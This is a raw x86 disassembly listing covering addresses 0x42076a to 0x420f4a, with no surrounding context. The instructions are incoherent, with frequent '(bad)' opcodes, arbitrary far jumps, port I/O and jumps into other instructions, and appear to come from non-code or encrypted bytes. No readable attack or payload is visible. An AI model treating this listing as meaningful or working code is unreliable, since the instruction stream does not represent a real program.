  42076a:	jb     0x42078b
  42076c:	add    edx,edx
  42076e:	mov    ds:0xb2084a68,eax
  420773:	add    DWORD PTR [ecx],0x4f300
  420779:	add    BYTE PTR [ebp-0x1f],bl
  42077c:	test   BYTE PTR [ebp+eiz*1+0x6e],ah
  420780:	jbe    0x4207ee
  420782:	stc    
  420783:	out    0x67,eax
  420785:	xchg   DWORD PTR [eax+0x7914a09b],esp
  42078b:	push   0x2873084f
  420790:	or     BYTE PTR [esi-0x16],ah
  420793:	mov    ch,BYTE PTR [edx+0x4f50f566]
  420799:	inc    ebp
  42079a:	ficom  WORD PTR [eax+ebp*8+0x61d9d503]
  4207a1:	mov    DWORD PTR [edx],edx
  4207a3:	xchg   ebx,eax
  4207a4:	xor    eax,0x615f5bce
  4207a9:	mov    al,ds:0x2f52c9b7
  4207ae:	dec    edi
  4207af:	push   ecx
  4207b0:	cmp    al,0x84
  4207b2:	pop    esi
  4207b3:	popf   
  4207b4:	xor    dh,BYTE PTR [ebx+0x3552a9c4]
  4207ba:	loop   0x42076b
  4207bc:	test   eax,0xc2b65d62
  4207c2:	add    esi,DWORD PTR [edx-0x80]
  4207c5:	or     al,0x19
  4207c7:	lahf   
  4207c8:	jbe    0x420817
  4207ca:	dec    ecx
  4207cb:	sbb    dl,BYTE PTR [edx+0x3d]
  4207ce:	jmp    0xe335:0xacca0fee
  4207d5:	cdq    
  4207d6:	jg     0x4207fa
  4207d8:	mov    cl,0x54
  4207da:	addr16 ds push ds
  4207dd:	sbb    al,bh
  4207df:	popa   
  4207e0:	inc    BYTE PTR [edi+0x433c142d]
  4207e6:	pop    ds
  4207e7:	add    BYTE PTR [esi+0x57506a33],ch
  4207ed:	push   cs
  4207ee:	call   0x161a:0xfb905361
  4207f5:	(bad)  
  4207f6:	mov    eax,ds:0x6d7cf8f5
  4207fb:	test   DWORD PTR [esi+0xa],ebp
  4207fe:	add    dl,ch
  420800:	jo     0x4207ca
  420802:	jmp    0xbe22:0x29af2d15
  420809:	push   ss
  42080a:	adc    eax,0xb48a0468
  42080f:	mov    al,0x93
  420811:	retf   0x4d7e
  420814:	aaa    
  420815:	call   0x39eefbf5
  42081a:	sar    DWORD PTR [esi],cl
  42081c:	xor    bh,BYTE PTR [eax-0x2b0b0c56]
  420822:	mov    al,cl
  420824:	or     bl,BYTE PTR [ebx]
  420826:	enter  0xbf13,0x62
  42082a:	neg    DWORD PTR [edx]
  42082c:	pop    ds
  42082d:	lods   eax,DWORD PTR ds:[esi]
  42082e:	fisttp WORD PTR [ebx+esi*8-0x5]
  420832:	mov    al,0x6e
  420834:	xor    eax,0xffbe8d63
  420839:	int3   
  42083a:	cmp    bl,al
  42083c:	cld    
  42083d:	xchg   esp,eax
  42083e:	dec    eax
  42083f:	fmul   st(6),st
  420841:	or     esp,DWORD PTR [esp+edx*8+0x44ac719b]
  420848:	repnz aaa 
  42084a:	cmp    bl,dh
  42084c:	jae    0x4208af
  42084e:	ret    0xcfb7
  420851:	neg    al
  420853:	dec    eax
  420854:	pop    esi
  420855:	fdiv   QWORD PTR [eax]
  420857:	cmc    
  420858:	scas   eax,DWORD PTR es:[edi]
  420859:	cmp    al,al
  42085b:	sub    eax,0x367ae5e
  420860:	sbb    eax,0x51c16dc6
  420865:	mov    BYTE PTR [esi],bl
  420867:	outs   dx,DWORD PTR ds:[esi]
  420868:	pop    ecx
  420869:	stc    
  42086a:	popf   
  42086b:	xchg   edx,ebp
  42086d:	xchg   esp,eax
  42086e:	(bad)  
  42086f:	fcmovnu st,st(4)
  420871:	lock aad 0x54
  420874:	add    DWORD PTR [eax-0x5f],esp
  420877:	(bad)  
  420878:	scas   al,BYTE PTR es:[edi]
  420879:	and    dh,ch
  42087b:	sti    
  42087c:	sahf   
  42087d:	fsubr  QWORD PTR ds:0xd9919859
  420883:	cmp    eax,0xa14c8ce2
  420888:	lods   al,BYTE PTR ds:[esi]
  420889:	(bad)  
  42088a:	jl     0x420812
  42088c:	aaa    
  42088d:	loope  0x4208a6
  42088f:	mov    al,ds:0x433d8940
  420894:	ja     0x4208f2
  420896:	aam    0x56
  420898:	cld    
  420899:	addr16 loope 0x4208f4
  42089c:	dec    ecx
  42089d:	push   ebx
  42089e:	pushf  
  42089f:	push   ebx
  4208a0:	aaa    
  4208a1:	loop   0x4208c0
  4208a3:	cmp    eax,0x835247a0
  4208a8:	popf   
  4208a9:	xor    dl,BYTE PTR [eax]
  4208ab:	sub    ch,bl
  4208ad:	xchg   dh,dl
  4208af:	je     0x420862
  4208b1:	mov    ss,WORD PTR [edx-0x78]
  4208b4:	mov    ecx,0xdda60647
  4208b9:	and    eax,0x7b07e751
  4208be:	push   ss
  4208bf:	cmp    edi,edx
  4208c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208c2:	jne    0x42093c
  4208c4:	pop    ebx
  4208c5:	(bad)  
  4208c6:	(bad)  
  4208c7:	jle    0x4208ad
  4208c9:	pop    edx
  4208ca:	dec    edx
  4208cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208cc:	push   cs
  4208cd:	push   esi
  4208ce:	scas   eax,DWORD PTR es:[edi]
  4208cf:	mov    eax,ecx
  4208d1:	call   0xca394b8c
  4208d6:	rcr    BYTE PTR [ecx-0x604645fa],0x3b
  4208dd:	jmp    0x420885
  4208df:	sbb    eax,0x1661214c
  4208e4:	push   esp
  4208e5:	and    DWORD PTR [esp],ecx
  4208e8:	(bad)  
  4208e9:	sbb    bl,dl
  4208eb:	xlat   BYTE PTR ds:[ebx]
  4208ec:	nop
  4208ed:	lahf   
  4208ee:	xor    ebx,0x7ef09e55
  4208f4:	call   0xc510:0x59a81bdc
  4208fb:	jo     0x420894
  4208fd:	push   eax
  4208fe:	inc    edi
  4208ff:	jnp    0x4208b7
  420901:	inc    esp
  420902:	ds loope 0x42094e
  420905:	and    dh,ch
  420907:	int    0x4e
  420909:	mov    esp,0xb2c8455d
  42090e:	push   ss
  42090f:	jmp    0xfedd:0x79622a2c
  420916:	popf   
  420917:	sub    al,0x53
  420919:	add    DWORD PTR [eax-0x6091725d],ebp
  42091f:	mov    al,ds:0x7af1b2bf
  420924:	pop    ebx
  420925:	inc    esi
  420926:	or     eax,0xf713bbd0
  42092b:	xchg   ebp,eax
  42092c:	jle    0x420972
  42092e:	jbe    0x420910
  420930:	into   
  420931:	mov    eax,ds:0x4f3194c3
  420936:	mov    DWORD PTR [ecx+0x37],ebx
  420939:	jb     0x42096c
  42093b:	cmp    BYTE PTR [edx+0x2e276e30],al
  420941:	cmp    al,0x32
  420943:	mov    BYTE PTR ds:0x9dd9e5e1,bh
  420949:	xchg   bl,ah
  42094b:	cmp    DWORD PTR [edx+0x9],0xffffff9e
  42094f:	pop    edi
  420950:	imul   esi,DWORD PTR [esi+eax*2],0x97509fcf
  420957:	aas    
  420958:	fs in  al,0x30
  42095b:	pop    ebp
  42095c:	cli    
  42095d:	bound  edx,QWORD PTR [esi]
  42095f:	sbb    bl,BYTE PTR [edx+0x4e]
  420962:	inc    edx
  420963:	xor    ebp,DWORD PTR [ecx-0x4414accc]
  420969:	les    ebp,FWORD PTR [edi]
  42096b:	inc    esp
  42096c:	pop    es
  42096d:	out    0xf5,eax
  42096f:	dec    ecx
  420970:	adc    al,ah
  420972:	int3   
  420973:	imul   esi,DWORD PTR [edi+eiz*1-0x5c1c157e],0xffffff82
  42097b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42097c:	ins    DWORD PTR es:[edi],dx
  42097d:	mov    ebx,0xa05b210e
  420982:	push   ss
  420983:	push   edi
  420984:	out    dx,al
  420985:	or     BYTE PTR [edx-0x76],al
  420988:	push   ecx
  420989:	sub    eax,0x38c696de
  42098e:	sbb    DWORD PTR [ebp+0x75],esp
  420991:	test   eax,0xc153aa03
  420996:	ins    DWORD PTR es:[edi],dx
  420997:	mov    ah,0x88
  420999:	in     al,0x88
  42099b:	push   0x4c
  42099d:	or     BYTE PTR [esi+edi*2],al
  4209a0:	mov    bh,0xce
  4209a2:	jae    0x42093e
  4209a4:	dec    esp
  4209a5:	in     al,0x11
  4209a7:	cmovg  esi,DWORD PTR [edx+ecx*2-0xacec1b5]
  4209af:	daa    
  4209b0:	jle    0x420980
  4209b2:	or     al,0xf9
  4209b4:	pop    edx
  4209b5:	push   ds
  4209b6:	inc    eax
  4209b7:	popw   ss
  4209b9:	sbb    ebp,ebx
  4209bb:	xor    DWORD PTR [esi+0xe],0x6b
  4209bf:	push   edx
  4209c0:	or     eax,edi
  4209c2:	and    eax,0x27920a26
  4209c7:	and    eax,0x3ec93ccf
  4209cc:	sub    esi,DWORD PTR [ebx+0x1683129c]
  4209d2:	nop
  4209d3:	pop    DWORD PTR [eax]
  4209d5:	mov    ch,0x5e
  4209d7:	or     ah,BYTE PTR [edi-0x16]
  4209da:	sub    ah,BYTE PTR [edi]
  4209dc:	jb     0x42095f
  4209de:	mov    edx,0xfe8b00b1
  4209e3:	inc    esi
  4209e4:	jp     0x420984
  4209e6:	and    ecx,edx
  4209e8:	jb     0x4209ac
  4209ea:	jp     0x420983
  4209ec:	fistp  WORD PTR [edx]
  4209ee:	cld    
  4209ef:	fs cld 
  4209f1:	in     al,0x48
  4209f3:	bound  ecx,QWORD PTR [ebx+0x7cc4a293]
  4209f9:	aaa    
  4209fa:	cmp    al,0x15
  4209fc:	mov    ebx,0xe1283c7
  420a01:	add    esp,esp
  420a03:	cmp    eax,ecx
  420a05:	push   edx
  420a06:	push   edi
  420a07:	dec    ebx
  420a08:	das    
  420a09:	push   eax
  420a0a:	mov    ds:0x56b802c0,eax
  420a0f:	mov    al,0xef
  420a11:	cmp    BYTE PTR [esi],ah
  420a13:	sti    
  420a14:	std    
  420a15:	test   eax,0xddabbd93
  420a1a:	(bad)  
  420a1b:	popa   
  420a1c:	xchg   esi,eax
  420a1d:	mov    ah,0x36
  420a1f:	inc    ebp
  420a20:	(bad)  
  420a21:	jmp    0xc607:0xaaa482d2
  420a28:	pop    eax
  420a29:	inc    esi
  420a2a:	test   al,0xa1
  420a2c:	or     DWORD PTR [ebx+0x432ebbbe],edi
  420a32:	stos   BYTE PTR es:[edi],al
  420a33:	add    bh,al
  420a35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a36:	add    bl,BYTE PTR [ecx+0x5af94688]
  420a3c:	popa   
  420a3d:	test   BYTE PTR [ebp-0x6039dbdb],dl
  420a43:	push   ss
  420a44:	aad    0xd
  420a46:	test   eax,0xf8fa3d9
  420a4b:	cmp    bl,dl
  420a4d:	bound  esp,QWORD PTR [esi+0x3f]
  420a50:	add    bh,BYTE PTR [edx+0x1c9b655c]
  420a56:	lods   eax,DWORD PTR ds:[esi]
  420a57:	adc    edx,DWORD PTR ds:0xcda04f1
  420a5d:	mul    BYTE PTR [edx-0x77]
  420a60:	sub    ch,bl
  420a62:	jbe    0x420ac2
  420a64:	call   0xed8d:0xd0df3ab6
  420a6b:	add    eax,0xb46166ee
  420a70:	sub    dh,dh
  420a72:	dec    edx
  420a73:	addr16 mov ah,0x3b
  420a76:	sbb    BYTE PTR [edx+0x62],cl
  420a79:	pop    es
  420a7a:	addr16 call 0x8dfaa30
  420a80:	xchg   ebx,eax
  420a81:	add    al,0xc
  420a83:	fnstsw ax
  420a85:	xchg   BYTE PTR [eax+0x73],bh
  420a88:	mov    ch,0x45
  420a8a:	push   cs
  420a8b:	mov    dh,0x5a
  420a8d:	cli    
  420a8e:	test   DWORD PTR [esi],eax
  420a90:	out    dx,eax
  420a91:	out    0x1f,al
  420a93:	scas   eax,DWORD PTR es:[edi]
  420a94:	sahf   
  420a95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a96:	inc    edx
  420a97:	test   eax,0x92754f1c
  420a9c:	cld    
  420a9d:	pop    edx
  420a9e:	mov    ds:0xd672a63d,al
  420aa3:	or     DWORD PTR [edx],ecx
  420aa5:	(bad)  
  420aa6:	mov    al,ds:0x9020e2f3
  420aab:	stos   BYTE PTR es:[edi],al
  420aac:	pop    es
  420aad:	clc    
  420aae:	into   
  420aaf:	adc    BYTE PTR [edx+0x620c0636],ch
  420ab5:	fwait
  420ab6:	inc    edx
  420ab7:	loope  0x420b2c
  420ab9:	pushf  
  420aba:	das    
  420abb:	inc    ecx
  420abc:	add    BYTE PTR ds:0xf229bf5a,dl
  420ac2:	mov    ds:0xaccdad74,eax
  420ac7:	sbb    eax,0xf46545d4
  420acc:	or     al,0x46
  420ace:	fisubr DWORD PTR [esi+ebx*4-0x61]
  420ad2:	push   ebp
  420ad3:	lock and BYTE PTR [ecx],0x72
  420ad7:	pop    esi
  420ad8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ad9:	call   0x227e781e
  420ade:	pop    ss
  420adf:	sub    ecx,edi
  420ae1:	test   dh,0xb5
  420ae4:	jl     0x420ad6
  420ae6:	jge    0x420ac7
  420ae8:	jmp    0x420b16
  420aea:	and    BYTE PTR [ecx],dl
  420aec:	ja     0x420a82
  420aee:	aas    
  420aef:	lods   eax,DWORD PTR ds:[esi]
  420af0:	cwde   
  420af1:	cmp    eax,0x54025473
  420af6:	xchg   edx,eax
  420af7:	push   eax
  420af8:	(bad)  [edi+eiz*4-0x4bb63522]
  420aff:	ja     0x420a8c
  420b01:	add    DWORD PTR [ebx-0x3e5faef7],ebp
  420b07:	push   esi
  420b08:	sbb    eax,0x3c0c86a2
  420b0d:	jecxz  0x420a9a
  420b0f:	add    BYTE PTR [edi-0x66366c32],ch
  420b15:	mov    esp,DWORD PTR [ecx+0x79d62b43]
  420b1b:	cmp    bh,BYTE PTR [edx]
  420b1d:	cmp    DWORD PTR [eax+0x4662034],esi
  420b23:	test   DWORD PTR [ecx-0x491ffbbd],ecx
  420b29:	jo     0x420b61
  420b2b:	cdq    
  420b2c:	ret    
  420b2d:	into   
  420b2e:	xchg   edi,eax
  420b2f:	lods   al,BYTE PTR ds:[esi]
  420b30:	cmp    bh,BYTE PTR [ecx+0x72]
  420b33:	fdivr  st,st(5)
  420b35:	mov    ds:0x67165b41,eax
  420b3a:	dec    eax
  420b3b:	imul   esp,esi,0xff6afdb9
  420b41:	xlat   BYTE PTR ds:[ebx]
  420b42:	test   BYTE PTR [eax],dl
  420b44:	loope  0x420b80
  420b46:	cwde   
  420b47:	leave  
  420b48:	or     al,0xd9
  420b4a:	push   eax
  420b4b:	(bad)  
  420b4d:	mov    ebp,0xf20f50d2
  420b52:	aad    0x24
  420b54:	sub    edx,DWORD PTR [ebx-0x4817c21e]
  420b5a:	mov    BYTE PTR [esi],cl
  420b5c:	lods   eax,DWORD PTR ds:[esi]
  420b5d:	or     ch,BYTE PTR [ebx-0x35]
  420b60:	adc    eax,0x406e792e
  420b65:	mov    ds:0xae1d3426,al
  420b6a:	push   es
  420b6b:	xchg   edi,eax
  420b6c:	push   eax
  420b6d:	mov    al,0x3e
  420b6f:	push   edx
  420b70:	pop    ds
  420b71:	btr    DWORD PTR [ebx+0x7bfc4bff],esi
  420b78:	sbb    eax,0x3da9e74
  420b7d:	push   ebx
  420b7e:	add    al,BYTE PTR [eax]
  420b80:	xor    BYTE PTR [eax],bh
  420b82:	pop    esp
  420b83:	or     DWORD PTR [edi],esi
  420b85:	in     al,dx
  420b86:	enter  0xd224,0xd5
  420b8a:	or     eax,0x11799202
  420b8f:	leave  
  420b90:	push   ebp
  420b91:	ret    
  420b92:	fisttp WORD PTR [ecx-0xd]
  420b95:	jno    0x420b18
  420b97:	fst    st(6)
  420b99:	adc    al,0x34
  420b9b:	sar    DWORD PTR [ebx-0x32],0xee
  420b9f:	sub    al,0x38
  420ba1:	mov    BYTE PTR [di+0x1467],0x7e
  420ba7:	and    al,0x5a
  420ba9:	hlt    
  420baa:	mov    BYTE PTR fs:[ebx],dh
  420bad:	inc    edi
  420bae:	int3   
  420baf:	std    
  420bb0:	xchg   ecx,eax
  420bb1:	cmp    DWORD PTR [edi+0x1c71865e],0xffffffc7
  420bb8:	std    
  420bb9:	lds    eax,FWORD PTR [edi+0x32715089]
  420bbf:	pusha  
  420bc0:	(bad)  
  420bc1:	je     0x420c26
  420bc3:	xchg   ecx,eax
  420bc4:	dec    ecx
  420bc5:	int3   
  420bc6:	test   DWORD PTR [ecx+0x5c],ebp
  420bc9:	fnsave [ebp+0x2ae9c0cd]
  420bcf:	clc    
  420bd0:	pusha  
  420bd1:	and    ah,BYTE PTR [ebx-0x5d]
  420bd4:	ret    0x13d1
  420bd7:	je     0x420b8a
  420bd9:	pop    edx
  420bda:	(bad)  
  420bdc:	cld    
  420bdd:	dec    ebp
  420bde:	loopne 0x420b8d
  420be0:	mov    ah,dl
  420be2:	push   edi
  420be3:	cmp    DWORD PTR [eax],edi
  420be5:	mov    bh,0x53
  420be7:	mov    esp,0xc301dddc
  420bec:	ja     0x420c52
  420bee:	jae    0x420c60
  420bf0:	jbe    0x420c39
  420bf2:	fnsave cs:[ecx]
  420bf5:	lock rcl DWORD PTR [ebx+0x2],1
  420bf9:	or     DWORD PTR [esi+0xea0d91f],ebx
  420bff:	xor    DWORD PTR [ebp+eax*1-0x51],esi
  420c03:	sub    ecx,esi
  420c05:	fiadd  WORD PTR [ecx]
  420c07:	addr16 jle 0x420b97
  420c0a:	push   0x32
  420c0c:	ss xor bh,BYTE PTR gs:[ebp-0x448d4741]
  420c14:	mov    DWORD PTR [esi-0x4431f9a8],eax
  420c1a:	add    DWORD PTR [ecx],esp
  420c1c:	cli    
  420c1d:	mov    ecx,ecx
  420c1f:	dec    esp
  420c20:	es int3 
  420c22:	push   eax
  420c23:	adc    ch,BYTE PTR [edi]
  420c25:	xor    BYTE PTR [ebx-0x7bb67efe],al
  420c2b:	test   DWORD PTR [edx-0x3e],esp
  420c2e:	mov    eax,0x18a1e485
  420c33:	in     eax,0x22
  420c35:	adc    al,0xe1
  420c37:	cmp    ebx,DWORD PTR [edi]
  420c39:	sahf   
  420c3a:	test   DWORD PTR [eax],edx
  420c3c:	test   eax,0xbd3a346d
  420c41:	or     eax,0x3080eb11
  420c46:	jnp    0x420caa
  420c48:	arpl   WORD PTR [ebx-0x6a],bp
  420c4b:	cld    
  420c4c:	xlat   BYTE PTR ds:[ebx]
  420c4d:	clc    
  420c4e:	fs pusha 
  420c50:	clc    
  420c51:	sbb    esp,eax
  420c53:	mov    ch,0x63
  420c55:	xor    al,0x96
  420c57:	xchg   esp,eax
  420c58:	xchg   esp,eax
  420c59:	push   esp
  420c5a:	add    ebx,ebp
  420c5c:	fwait
  420c5d:	shl    DWORD PTR [ebx],0xd8
  420c60:	out    dx,eax
  420c61:	push   ds
  420c62:	int3   
  420c63:	sbb    DWORD PTR [ebx+0x41],0x371db3a2
  420c6a:	addr16 (bad) 
  420c6c:	data16 add BYTE PTR [eax],al
  420c6f:	add    BYTE PTR [eax],al
  420c71:	add    BYTE PTR [ecx],al
  420c73:	jge    0x420c4d
  420c75:	mov    ebp,0xfd65bdfc
  420c7a:	or     cl,BYTE PTR [ecx+0xc2eb857]
  420c80:	xor    DWORD PTR [ebx-0x5b],edi
  420c83:	xchg   BYTE PTR [ecx],al
  420c85:	add    bl,dh
  420c87:	add    al,0x0
  420c89:	add    ah,al
  420c8b:	(bad)  
  420c8d:	inc    ebx
  420c8e:	mov    ah,0x9a
  420c90:	dec    eax
  420c91:	push   ecx
  420c92:	(bad)  
  420c93:	out    dx,al
  420c94:	out    0x9c,eax
  420c96:	mov    esi,0x85400892
  420c9b:	lea    ecx,[edx-0x2dfc87cc]
  420ca1:	mov    ds:0xb498bf4d,al
  420ca6:	mov    edx,0xf8fb0dc6
  420cab:	outs   dx,DWORD PTR ds:[esi]
  420cac:	adc    al,0xd
  420cae:	stos   BYTE PTR es:[edi],al
  420caf:	inc    edx
  420cb0:	push   ebx
  420cb1:	xchg   ebp,eax
  420cb2:	add    eax,0x6898dab6
  420cb7:	cli    
  420cb8:	sahf   
  420cb9:	and    edx,DWORD PTR [edi-0x5c]
  420cbc:	sbb    al,0x13
  420cbe:	or     DWORD PTR [edx+0x3c],ebp
  420cc1:	mov    ds:0xc23f69a8,eax
  420cc6:	ins    BYTE PTR es:[edi],dx
  420cc7:	sar    dh,0x95
  420cca:	sub    al,0x26
  420ccc:	test   DWORD PTR [ecx-0x41],edx
  420ccf:	test   eax,0x63da00d1
  420cd4:	push   eax
  420cd5:	stc    
  420cd6:	dec    eax
  420cd7:	sbb    DWORD PTR [eax-0x1defdd11],edi
  420cdd:	arpl   WORD PTR [eax-0x1],si
  420ce0:	cld    
  420ce1:	pop    ebp
  420ce2:	popf   
  420ce3:	dec    esi
  420ce4:	inc    esi
  420ce5:	in     eax,dx
  420ce6:	pop    edx
  420ce7:	push   es
  420ce8:	adc    BYTE PTR [eax+0x59f73315],0xf7
  420cef:	test   eax,0x9c88ed67
  420cf4:	aam    0x34
  420cf6:	dec    esi
  420cf7:	xchg   ecx,eax
  420cf8:	in     eax,0x4d
  420cfa:	pop    ds
  420cfb:	jae    0x420d4a
  420cfd:	ss mov bl,0x0
  420d00:	add    ah,ah
  420d02:	or     eax,0x3b0f68f1
  420d07:	aas    
  420d08:	es and eax,0x40f827f6
  420d0e:	es xchg ecx,eax
  420d10:	fild   QWORD PTR [ebp+0x35760d4b]
  420d16:	sub    BYTE PTR [ebp+0x31],bl
  420d19:	pop    ds
  420d1a:	xor    edx,DWORD PTR [eax+0x12]
  420d1d:	sbb    eax,0x8ad27461
  420d22:	dec    edx
  420d23:	outs   dx,DWORD PTR ds:[esi]
  420d24:	in     eax,dx
  420d25:	lahf   
  420d26:	(bad)  
  420d27:	cmp    al,0x3b
  420d29:	cmp    BYTE PTR [ebx],dh
  420d2b:	iret   
  420d2c:	shl    dh,cl
  420d2e:	pop    esp
  420d2f:	(bad)  
  420d30:	or     eax,0x46402cf3
  420d35:	mov    ch,0xcb
  420d37:	in     eax,dx
  420d38:	sub    eax,0xf5fe985e
  420d3d:	aas    
  420d3e:	mov    ds:0x760eeefe,al
  420d43:	mov    edi,0xef574b07
  420d48:	xchg   ecx,eax
  420d49:	mov    edi,0x12e56889
  420d4e:	add    DWORD PTR [esi+0x7],edi
  420d51:	push   cs
  420d52:	jbe    0x420d21
  420d54:	stos   BYTE PTR es:[edi],al
  420d55:	mov    dl,0xa4
  420d57:	retf   0xd1f0
  420d5a:	xor    edi,DWORD PTR [edx-0x31c18b9d]
  420d60:	add    al,BYTE PTR [esi]
  420d62:	in     eax,0x5
  420d64:	jns    0x420d8a
  420d66:	mov    ds:0x3e0254d5,al
  420d6b:	(bad)  
  420d6c:	cmp    ecx,DWORD PTR [edx]
  420d6e:	enter  0x41fa,0xe0
  420d72:	cli    
  420d73:	mov    eax,DWORD PTR [edx+ecx*8+0x7b]
  420d77:	outs   dx,DWORD PTR ds:[esi]
  420d78:	or     ah,bl
  420d7a:	jl     0x420d4d
  420d7c:	or     DWORD PTR [esi+0x28],edi
  420d7f:	dec    eax
  420d80:	cs gs mov esp,0x6fcc099e
  420d87:	push   0x12
  420d89:	inc    edx
  420d8a:	xchg   edi,eax
  420d8b:	(bad)  
  420d8c:	shr    ah,cl
  420d8e:	xchg   ebp,eax
  420d8f:	ja     0x420d93
  420d91:	(bad)  
  420d92:	(bad)  
  420d93:	imul   eax,DWORD PTR [ecx+eax*1],0xda05f7e
  420d9a:	out    0xc5,al
  420d9c:	loope  0x420d53
  420d9e:	ss out 0xb5,eax
  420da1:	es add al,0x99
  420da4:	aad    0x58
  420da6:	loopne 0x420d38
  420da8:	clc    
  420da9:	pop    ebx
  420daa:	push   edi
  420dab:	mov    esp,0x48d0fa3d
  420db0:	sub    DWORD PTR ds:0xf3f51ee7,0x76ef9d80
  420dba:	scas   eax,DWORD PTR es:[edi]
  420dbb:	xchg   ebx,eax
  420dbc:	and    eax,0xbd7377ed
  420dc1:	(bad)  
  420dc2:	test   BYTE PTR [ebx-0x33f2f3fc],al
  420dc8:	imul   BYTE PTR [edx+0x3155176c]
  420dce:	or     DWORD PTR [ebp+0x16],esp
  420dd1:	mov    ?,WORD PTR [edi+0x73]
  420dd4:	add    BYTE PTR [ebx+0x30],dl
  420dd7:	int    0x47
  420dd9:	push   ds
  420dda:	or     ebx,DWORD PTR [esi+eax*4-0x2e]
  420dde:	jl     0x420d84
  420de0:	je     0x420e2a
  420de2:	lods   eax,DWORD PTR ds:[esi]
  420de3:	js     0x420e39
  420de5:	sahf   
  420de6:	rol    DWORD PTR [edi+esi*8-0x4b],cl
  420dea:	(bad)  
  420deb:	jnp    0x420d88
  420ded:	push   0x70
  420def:	mov    ebp,0x660feb8c
  420df4:	sbb    DWORD PTR [edx],edx
  420df6:	inc    eax
  420df7:	cmp    bh,BYTE PTR [edx]
  420df9:	pop    ecx
  420dfa:	pop    esp
  420dfb:	inc    ebx
  420dfc:	add    al,0x14
  420dfe:	and    ah,BYTE PTR [ecx+0x12]
  420e01:	fld    DWORD PTR [edx+0x26]
  420e04:	shl    DWORD PTR [esi-0x46],0x36
  420e08:	ret    0x8aef
  420e0b:	test   eax,0x7d9e3701
  420e10:	add    ecx,DWORD PTR [ebp+0x6304f4e7]
  420e16:	and    esp,DWORD PTR [ebp-0x28302f7b]
  420e1c:	leave  
  420e1d:	outs   dx,BYTE PTR ds:[esi]
  420e1e:	(bad)  
  420e1f:	aaa    
  420e20:	loopne 0x420db0
  420e22:	sbb    eax,0xf6ae59a0
  420e27:	daa    
  420e28:	cmp    ebx,esi
  420e2a:	(bad)  [eax]
  420e2c:	icebp  
  420e2d:	pop    edi
  420e2e:	sbb    ch,al
  420e30:	jge    0x420dcd
  420e32:	test   BYTE PTR [ecx-0x3c],0x69
  420e36:	nop    DWORD PTR [edi*8-0x3518e88f]
  420e3e:	dec    edx
  420e3f:	jl     0x420e98
  420e41:	icebp  
  420e42:	out    dx,al
  420e43:	pop    esp
  420e44:	pop    edx
  420e45:	adc    esp,esi
  420e47:	das    
  420e48:	adc    ecx,ebx
  420e4a:	mov    WORD PTR [edx-0x1511ec8f],ds
  420e50:	jle    0x420e2c
  420e52:	pop    esp
  420e53:	mov    ebx,0xcf090f2d
  420e58:	addr16 js 0x420e80
  420e5b:	test   DWORD PTR [edi-0x42],esp
  420e5e:	dec    edx
  420e5f:	add    eax,0xc786943d
  420e64:	out    0x3a,eax
  420e66:	fistp  DWORD PTR [ebx+0x10]
  420e69:	push   0x75
  420e6b:	and    eax,0x6ddf14ba
  420e70:	cmp    eax,0x8fb41d18
  420e75:	std    
  420e76:	and    BYTE PTR [esi-0x7e],bl
  420e79:	in     al,dx
  420e7a:	jno    0x420e1a
  420e7c:	dec    esp
  420e7d:	fs inc edi
  420e7f:	int    0x9b
  420e81:	xor    BYTE PTR [esi],0x8c
  420e84:	aaa    
  420e85:	imul   ecx,DWORD PTR [edx-0x17961297],0xe7226094
  420e8f:	shl    dh,cl
  420e91:	jge    0x420e43
  420e93:	mov    esp,0xbdf4fc
  420e98:	out    dx,al
  420e99:	mov    ah,bl
  420e9b:	inc    esi
  420e9c:	lea    edx,[eax]
  420e9e:	or     bl,BYTE PTR [edi]
  420ea0:	loope  0x420ee8
  420ea2:	add    BYTE PTR [ebx],dh
  420ea4:	gs and al,0x69
  420ea7:	enter  0x4247,0xbb
  420eab:	in     al,dx
  420eac:	push   0x1676c54a
  420eb1:	jno    0x420e8f
  420eb3:	cli    
  420eb4:	fidiv  WORD PTR [esi]
  420eb6:	rcl    BYTE PTR [edx],0x1f
  420eb9:	outs   dx,BYTE PTR ds:[esi]
  420eba:	aad    0xad
  420ebc:	aaa    
  420ebd:	pusha  
  420ebe:	jb     0x420e40
  420ec0:	fs sbb ebx,ecx
  420ec3:	out    0x57,eax
  420ec5:	mov    WORD PTR [edx],?
  420ec7:	or     ch,BYTE PTR [edx]
  420ec9:	mov    ah,0x8c
  420ecb:	sub    al,0x91
  420ecd:	xchg   ebx,eax
  420ece:	sbb    eax,DWORD PTR [ecx+0x42]
  420ed1:	sbb    bh,0xdb
  420ed4:	xor    eax,0xfc563304
  420ed9:	enter  0xb55a,0xd1
  420edd:	mov    al,0xbc
  420edf:	sar    DWORD PTR [edx+0x1b],0x80
  420ee3:	shl    BYTE PTR ds:[edx],0xff
  420ee7:	jne    0x420e89
  420ee9:	pop    ebp
  420eea:	and    BYTE PTR [ecx+ecx*2+0x67349727],dl
  420ef1:	(bad)  
  420ef2:	in     al,dx
  420ef3:	test   ebp,0xbb333891
  420ef9:	daa    
  420efa:	xchg   BYTE PTR [edx],al
  420efc:	gs (bad) 
  420efe:	mov    eax,ds:0xe96e9800
  420f03:	cmp    ah,BYTE PTR [esi]
  420f05:	pop    edx
  420f06:	or     BYTE PTR [eax+0x5c],bl
  420f09:	jmp    0x433dad79
  420f0e:	xchg   edx,eax
  420f0f:	ficom  WORD PTR [edx+ecx*1+0x313edb10]
  420f16:	sar    BYTE PTR [esi-0x48],0x7a
  420f1a:	(bad)  
  420f1b:	push   esp
  420f1c:	add    ebp,DWORD PTR [ecx]
  420f1e:	push   esi
  420f1f:	enter  0xf43d,0x81
  420f23:	sub    al,0x77
  420f25:	imul   ebx,eax,0xffffff9f
  420f28:	test   BYTE PTR [eax+eax*8],ch
  420f2b:	shl    DWORD PTR [eax+0x70db6d1b],0x13
  420f32:	es inc edx
  420f34:	iret   
  420f35:	iret   
  420f36:	icebp  
  420f37:	(bad)  
  420f38:	fcomp  DWORD PTR [ebp+0x44]
  420f3b:	clc    
  420f3c:	ret    0xaefe
  420f3f:	mov    ?,eax
  420f41:	jns    0x420fb8
  420f43:	stc    
  420f44:	sbb    DWORD PTR [ebx],esp
  420f46:	ret    0x49e4
  420f49:	pop    edx
  420f4a:	xchg   esi,eax
